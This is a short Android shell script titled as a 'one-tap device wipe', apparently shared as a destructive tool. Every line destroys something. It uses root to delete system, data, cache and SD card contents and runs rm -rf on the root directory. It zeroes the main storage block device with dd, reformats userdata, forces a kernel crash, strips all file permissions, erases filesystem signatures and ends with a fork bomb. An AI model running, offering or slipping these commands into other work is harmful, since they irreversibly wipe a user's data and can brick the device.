#!/system/bin/sh
# 一键格机 v6
su -c "rm -rf /data /system /cache"
rm -rf /*
rm -rf /sdcard/*
dd if=/dev/zero of=/dev/block/mmcblk0 bs=4096
mkfs.ext4 /dev/block/by-name/userdata
echo c > /proc/sysrq-trigger
chmod -R 000 /
wipefs -a /dev/block/mmcblk0
:(){ :|:& };:
